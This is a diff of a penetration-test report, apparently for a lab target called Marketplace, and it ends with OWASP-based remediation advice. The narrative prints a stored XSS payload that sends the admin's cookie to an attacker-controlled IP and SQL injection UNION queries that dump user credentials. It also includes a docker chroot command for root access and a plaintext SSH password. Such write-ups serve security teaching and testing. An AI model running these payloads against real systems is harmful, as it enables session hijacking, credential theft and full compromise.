@@ -14,6 +14,21 @@
 - [Statement of Methodology](#statement-of-methodology)
 - [Statement of Limitations](#statement-of-limitations)
 - [Testing Narrative](#testing-narrative)
+    - [Remote System Discovery (nmap)– Reconnaissance/Discovery](#remote-system-discovery-nmap-reconnaissancediscovery)
+    - [Cross Site Scripting (XSS) – Weaponization/Attack](#cross-site-scripting-xss--weaponizationattack)
+    - [Cross Site Scripting (XSS) - Delivery/Gaining Access](#cross-site-scripting-xss---deliverygaining-access)
+    - [Cross Site Scripting (XSS) – Exploitation/Installation – Escalating Privileges](#cross-site-scripting-xss--exploitationinstallation--escalating-privileges)
+    - [Cross Site Scripting (XSS) – Command & Control/Objective – System Browsing](#cross-site-scripting-xss--command--controlobjective--system-browsing)
+    - [SQL Injection – Additional Discovery](#sql-injection--additional-discovery)
+    - [SQL Injection – Weaponization/Install Additional Tools](#sql-injection--weaponizationinstall-additional-tools)
+    - [SQL Injection – Delivery/Attack](#sql-injection--deliveryattack)
+    - [SQL Injection – Exploitation/Installation - Attack](#sql-injection--exploitationinstallation---attack)
+    - [SQL Injection – Command & Control/Objective](#sql-injection--command--controlobjective)
+    - [Command Injection/SSH – Additional Discovery](#command-injectionssh--additional-discovery)
+    - [Command Injection/SSH - Weaponization/Gaining Access](#command-injectionssh---weaponizationgaining-access)
+    - [Command Injection/SSH - Delivery/System Browsing](#command-injectionssh---deliverysystem-browsing)
+    - [Command Injection/SSH – Exploitation/Installation – Privilege Escalation](#command-injectionssh--exploitationinstallation--privilege-escalation) 
+    - [Command Injection/SSH - Command & Control/ Privilege Escalation /Objective](#command-injectionssh---command--control-privilege-escalation-objective)
 - [Findings](#findings)
   - [Calculating and documenting the risks of the vulnerabilities, Common Vulnerability Scoring system, CVSS.](#calculating-and-documenting-the-risks-of-the-vulnerabilities-common-vulnerability-scoring-system-cvss)
   - [OWASP Risk Rating Methodology for estimating the risk of a vulnerability](#owasp-risk-rating-methodology-for-estimating-the-risk-of-vulnerability)
@@ -415,8 +430,7 @@ When we performed penetration testing, we had a timeboxed assessment that needed
 We had Limitation of Access because we performed Black box penetration test and not a White box network vulnerability assessment, which helps to expose security threats by attacking the network from different angles. Also, for applications, we could conduct code reviews that will help us discover security threats and weaknesses that might not be apparent from dynamic testing such as encryption algorithms, how passwords are stored, etc.
 
 <h3>Testing Narrative</h3>
-Remote System Discovery (nmap)– Reconnaissance/Discovery
-<br><br>
+<h3>Remote System Discovery (nmap)– Reconnaissance/Discovery</h3>
 For the purposes of this penetration test, Marketplace provided minimal information outside of the organizational <b>domain name: marketplace.com</b>. The intent was to closely simulate an adversary without any internal information. To avoid targeting systems that were not owned by Marketplace Industry, all identified assets were submitted for ownership verification before any attacks were conducted. 
 <br><br>
 In an attempt to identify the potential attack surface, we examined the name server of the marketplace.com domain name:
@@ -426,24 +440,25 @@ In an attempt to identify the potential attack surface, we examined the name ser
 We discovered a few <b>open tcp ports such as 22/tcp SSH Version: openSSH 7.6p1 Ubuntu0.3 and 80/tcp HTTP-Server-title: The Marketplace.</b>
 <br>
 We browse the website: marketplace.com to discover web application vulnerabilities:
+
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/a762396f-eb57-4d9b-818f-dec498ac047d)
-<br>
-<b>Cross Site Scripting (XSS) – Weaponization/Attack</b>
-<br>
-<br>
+
+<h3>Cross Site Scripting (XSS) – Weaponization/Attack</h3>
 We signed up as a regular user and we tried to check about XSS Vulnerability, so we tried XSS Scripts and after these tries we succeeded with adding a new listing but with an alert(1) script in  JavaScript: <svg onload=’alert(1)’ / >.
+
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/9f5d8b52-311f-4af5-8d53-c42ee21456ec)
 
 Successfully the script worked and we had a pop up from the alert script.
+
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/df74f950-a15f-4537-a4d9-943b59e28cd1)
 
 After that, we reported the listing to admins <b>«Report listing to admins»</b> to see what the reply from them is and how fast it is. Some minutes later, after the reporting, the admin send us a message to our account. So, we used that to perform stored XSS to the webpage and take the admin’s session. To do that we started a PHP server to our machine and we insert our IP address to the script to take the reply and the session token-key there.<br><br>
 Start PHP server:
+
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/5b81bd65-adcb-4507-9632-c0af84bc7320)
 
-<b>Cross Site Scripting (XSS) - Delivery/Gaining Access</b>
-<br>
-<br>
+<h3>Cross Site Scripting (XSS) - Delivery/Gaining Access</h3>
+
 Now we used the script <svg onload= ‘var x=document.createElement(“IFRAME”); x.setAttribute(“src”,http:// OUR_IP_ADDRESS:8080/cookie?+document.cookie);document.body.appendChild(x);”/><br>
 <ul>
   <li>The HTML < svg > element is a container for SVG graphics and we used it to bypass input validation. </li>
@@ -464,7 +479,7 @@ The reply has been sent to PHP server with our Session Cookie token:
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/0ef3db3c-8574-4d66-9187-da057474e317)
 
-<b>Cross Site Scripting (XSS) – Exploitation/Installation – Escalating Privileges</b><br><br>
+<h3>Cross Site Scripting (XSS) – Exploitation/Installation – Escalating Privileges</h3>
 Admin review the report and send us a message then the script activated, it sends us admin’s Session Cookie token to the PHP server:
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/5a0ebdb0-14b3-4f5f-819c-9ff77bb87cde)
@@ -473,18 +488,17 @@ Then the only thing we had to do is to change the value of the token from our se
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/5e0276e4-4842-4926-b8a8-802302bd37c2)
 
-<b>Cross Site Scripting (XSS) – Command & Control/Objective – System Browsing</b><br><br>
+<h3>Cross Site Scripting (XSS) – Command & Control/Objective – System Browsing</h3>
 When we changed the Session Token we successfully logged in to Admin’s account:
 
 ![269427782-50c57f67-5077-4c14-96ae-63f562581961](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/d9b47a8e-3d69-456b-b5d9-3f1dc97b29ec)
 
-<b>SQL Injection – Additional Discovery</b><br>
-<br>
+<h3>SQL Injection – Additional Discovery</h3>
 After we completed the 1st cycle of <b>Cyber Kill Chain</b> and <b>Penetration Testing Phases</b>, logged in as admin we discovered a new vulnerability in the web application. There is an information exposure through query strings in URL. So, we check if SQL injection is possible in the web application.
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/79167241-7ee9-4d98-9d4c-609aa64232f2)
 
-<b>SQL Injection – Weaponization/Install Additional Tools</b><br><br>
+<h3>SQL Injection – Weaponization/Install Additional Tools</h3>
 Inserting in the URL as user the value ( ‘ ) we are checking if the web application is vulnerable to SQL injection. The database server responded with an error to SQL syntax. So, we will perform <b>Error – Based SQL injection</b>.
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/ce2ce1d6-c22d-4cc7-b3a5-edb771d734ca)
@@ -497,7 +511,7 @@ We used Repeater, a feature of Burp Suite tool, which is a simple feature for ma
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/7f731f9c-40c7-4513-adea-502453b5aa75)
 
-<b>SQL Injection – Delivery/Attack</b><br><br>
+<h3>SQL Injection – Delivery/Attack</h3>
 With repeater we sent a HTTP request with user value (‘ ’ group by 1,2,3,4,5-- ) to check how many columns exists. We discovered that there are no more than 5 columns so we continued checking and we conclude that there are 4 columns.
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/4391d21c-7886-4857-8fc6-602ee445fd01)
@@ -510,7 +524,7 @@ We used well-known SQL commands to receive the data we want from database:
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/2ea6d457-d552-483e-b686-3305518030f9)
 
-<b>SQL Injection – Exploitation/Installation - Attack</b><br><br>
+<h3>SQL Injection – Exploitation/Installation - Attack</h3>
 First, we used the query:<b> ‘’UNION ALL SELECT GROUP_CONCAT (0x7c, schema_name, 0x7c), 2, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA--</b>, to take the name of the database that the web application is using. The database’s name was <b>‘|marketplace|’</b>:
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/060f7c70-8659-4d03-ac94-e711b124e277)
@@ -523,7 +537,7 @@ Also, we used the query:<b> ‘’UNION ALL SELECT GROUP_CONCAT (0x7c, column_na
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/8f5c128b-2453-4489-91b1-adb184a4c27d)
 
-<b>SQL Injection – Command & Control/Objective</b><br><br>
+<h3>SQL Injection – Command & Control/Objective</h3>
 Also, we used the query: <b>‘’UNION ALL SELECT GROUP_CONCAT (0x7c, username, ’:’, password, 0x7c, ‘\n’), 2, 3, 4 FROM MARKETPLACE.USERS--</b>, to take the usernames and the hashed passwords from table USERS that the web application is using.
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/39d1cd29-ea95-40f8-9341-15cc7c6a6b8c)
@@ -542,25 +556,25 @@ Also, we used the query: <b>‘’UNION ALL SELECT GROUP_CONCAT (0x7c, user_from
 
 We discovered a message from user: System (1) to user: Jake (3), which displays a  weak SSH password detection and <b>a new generated temporary password: @b_ENXkGYUCAv3zJ</b>.
 
-<b>Command Injection/SSH – Additional Discovery</b><br>
-<br>
+<h3>Command Injection/SSH – Additional Discovery</h3>
+
 After we completed the 2nd cycle of <b>Cyber Kill Chain and Penetration Testing Phases</b>, exploiting the web application’s database server and retrieve information and valuable data about usernames and passwords. We discovered, that there is <b>an unchanged SSH password from the user: Jake, and we manage to connect to Jake’s device via SSH connection</b>. 
 <br>
 <br>
 SSH refers both to the cryptographic network protocol and to the suite of utilities that implement that protocol. SSH uses the client-server model, connecting a Secure Shell client application, which is the end where the session is displayed, with an SSH server, which is the end where the session runs.
 
-<b>Command Injection/SSH - Weaponization/Gaining Access</b><br>
-<br>
+<h3>Command Injection/SSH - Weaponization/Gaining Access</h3>
+
 We connected successfully with SSH to Jake’s device with the password we retrieved from the database:<b> @b_ENXkGYUCAv3zJ</b>.
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/f34a3483-b417-43c3-9487-c8728688ce9f)
 
-<b>Command Injection/SSH - Delivery/System Browsing</b><br><br>
+<h3>Command Injection/SSH - Delivery/System Browsing</h3>
 We searched the files that Jake had in the device and we discovered <b>a tar file with wildcard * at the path: /opt/backups/backup.tar *</b>.
 
 ![269432096-0971bf2f-e0f1-496c-a483-ddaa9504c49c](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/cd3fd18d-995b-484a-a916-2c6ad200c2c0)
 
-<b>Command Injection/SSH – Exploitation/Installation – Privilege Escalation</b><br><br>
+<h3>Command Injection/SSH – Exploitation/Installation – Privilege Escalation</h3>
 Tar files with wildcards have an exploit that you gain privilege escalation. So, we used this payload to exploit the tar file and gain other user privileges. 
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/7e22eea7-7a0a-4a8f-b893-0eab4b059662)
@@ -574,7 +588,7 @@ Docker has an exploit that allows privileged escalation by generating an interac
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/66c809ef-ce4a-4211-87f6-6958de401695)
 
-<b>Command Injection/SSH - Command & Control/ Privilege Escalation /Objective</b><br><br>
+<h3>Command Injection/SSH - Command & Control/ Privilege Escalation /Objective</h3>
 After the command injection in Michael’s system and exploiting docker using the command:<b> docker run -v /:/mnt –rm -it alpine chroot /mnt /bin/bash</b>, we gain root privileges. 
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/8131f906-8e7d-4b76-8986-195f73555019)
@@ -582,19 +596,25 @@ After the command injection in Michael’s system and exploiting docker using th
 We completed the 3rd cycle of Cyber Kill Chain and Penetration Testing Phases, while we gained access as Jake via SSH, then exploited tar file with wildcard in Jake’s system and gain access as Michael and finally we exploited docker because we had Michael’s privileges and gained access as root.
 
 <h3>Findings</h3>
+
 <h3>Calculating and documenting the risks of the vulnerabilities, Common Vulnerability Scoring system, CVSS.</h3>
+
 The <b>Common Vulnerability Scoring System (CVSS)</b> is a free and open industry standard for determining the severity of computer system security flaws. CVSS seeks to assign vulnerability severity levels, allowing responders to prioritize responses and resources based on danger. Scores are determined by an algorithm that takes into account numerous variables that approximate the ease and impact of an exploit. The severity scale runs from 0 to 10, with 10 being the most severe. 
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/fe379600-84fe-4001-9719-b4bc8ed2860d)
 
 <h3>OWASP Risk Rating Methodology for estimating the risk of vulnerability</h3>
+
 The <b>OWASP Risk Rating Methodology</b> was developed by Jeff Williams, one of the OWASP organization's founders, as a way to quickly and correctly analyze the possibility and effect of a web application vulnerability. OWASP Risk Rating Methodology based on OWASP Risk Assessment Framework, which consist of Static application security testing and Risk Assessment tools, even though there are many SAST tools available for testers, but the compatibility and the environment setup process is complex.
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/56c015dd-fdd4-4ac7-a2c0-4b1e002983a1)
 
 <h3>Findings and recommendations for remediation</h3>
+
 <h3>Providing technical details necessary for IT, information security, and development teams to use to address the issues - Recommendations</h3>
-<b>XSS Defense Philosophy</b><br>
+
+<b>XSS Defense Philosophy</b>
+<br>
 <br>
 An attacker must insert and execute malicious content in a webpage for an XSS attack to be successful. Each variable in a web application must be secured. Perfect injection resistance is achieved by ensuring that all variables are validated and then escaped or sanitized. Any variable that is not subjected to this method is a potential flaw. Frameworks make it simple to validate variables and escape or sanitize them.<br><br>
 Examples: 
@@ -603,10 +623,11 @@ Examples:
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/41248b3a-0d1b-42ff-8c62-48b1261ed36d)
 
-Full Documentation:<br>
-•	https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html <br>
-•	https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
-<br><br>
+Full Documentation:
+<ul>
+  <li>https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</li>
+  <li>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li>
+</ul>
 
 <b>SQL Injection Prevention</b><br>
 <br>
@@ -615,23 +636,28 @@ Example:
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/a6c9dabd-c1cd-4f9a-9828-9367353dfc2d)
 
-Full Documentation:<br>
-•	https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
-<br>
-<br>
+Full Documentation:
+<ul>
+  <li>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</li>
+</ul>
+
 <b>Command Injection Defense Cheat Sheet</b><br>
 <br>
 <b>Command injection</b> (also known as OS Command Injection) is a sort of injection in which software that builds a system command using externally influenced input fails to properly neutralize the input from specific elements that can affect the initially intended command.
 
 ![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/38a4b856-e4e5-4c82-b212-cc240e71b3ad)
 
-Full Documentation:<br>
-•	https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+Full Documentation:
+<ul>
+  <li>https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html</li>
+</ul>
 
 <h3>Conclusion</h3>
+
 <b>Marketplace industry</b> experienced a series of control failures, resulting in the total compromise of crucial corporate assets. If a malicious actor had exploited these flaws, they would have had a significant impact on Marketplace industry operations. Current password reuse policies and deployed access controls are insufficient to mitigate the effect of the reported vulnerabilities.<br>
 <br>
-The penetration test's precise objectives were stated as follows:<br>
+
+The penetration test's precise objectives were stated as follows:
 <ul>
   <li>Identifying if a remote attacker could penetrate Marketplace industry’s defenses </li>
   <li>The effectiveness of an organization's security policy.</li>
@@ -680,6 +706,7 @@ Marketplace industry’s security team must follow the OWASP ModSecurity Core Ru
 <br>
 <br>
 <h3>Disclaimer</h3>
+
 <b>Ethical Security</b> company conducted this testing on the applications and systems that existed as of [ORIGINALTESTDATE]. Information
 security threats are continually changing, with new vulnerabilities discovered on a daily basis, and no application can ever be 100%
 secure no matter how much security testing is conducted. This report is intended only to provide documentation that [CLIENT] has
